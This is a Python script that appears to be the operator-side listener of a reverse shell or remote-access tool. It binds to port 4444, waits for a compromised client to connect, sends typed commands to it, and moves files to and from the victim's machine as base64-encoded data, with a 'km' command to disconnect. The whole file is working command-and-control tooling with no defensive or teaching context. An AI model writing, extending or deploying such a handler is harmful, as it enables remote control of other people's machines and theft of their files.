import socket 
from colorama import Fore, Style, init
import json
import os
import base64

# Initialize colorama
init(autoreset=True)

# Server configuration
HOST = "127.0.0.1"  # Replace with your server's IP address
PORT = 4444  # Replace with your desired port

# Print starting message
print(Fore.GREEN + "Starting TCP Handler...")

# Set up the server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

# Wait for a connection
print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
client_socket, client_address = server.accept()
print(Fore.GREEN + f"Connection established with {client_address}")

def send_json(data):
    json_data = json.dumps(data)
    client_socket.send(json_data.encode())

def receive_json():
    json_data = ""
    while True:
        try:
            json_data = json_data + client_socket.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
    return "[+] Download successful [+]"

def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read()).decode()

try:
    while True:
        # Receive the prompt from the client
        prompt = client_socket.recv(1024).decode("utf-8")
        print(Fore.CYAN + prompt, end="")

        # Get user input
        command = input()

        # Send the command to the client
        send_json(command)

        if command.lower() == "km":
            print(Fore.RED + "Disconnecting from client...")
            client_socket.close()
            break

        # Handle upload command
        if command.startswith("upload"):
            file_path = command.split(" ")[1]
            file_content = read_file(file_path)
            send_json(["upload", file_path, file_content])
        
        # Handle download command
        if command.startswith("download"):
            file_path = command.split(" ")[1]
            response = receive_json()
            write_file(file_path, response)

        # Receive the output from the client
        output = receive_json()
        print(Fore.WHITE + output)

except KeyboardInterrupt:
    print(Fore.RED + "\nShutting down the server.")
    client_socket.close()
    server.close()
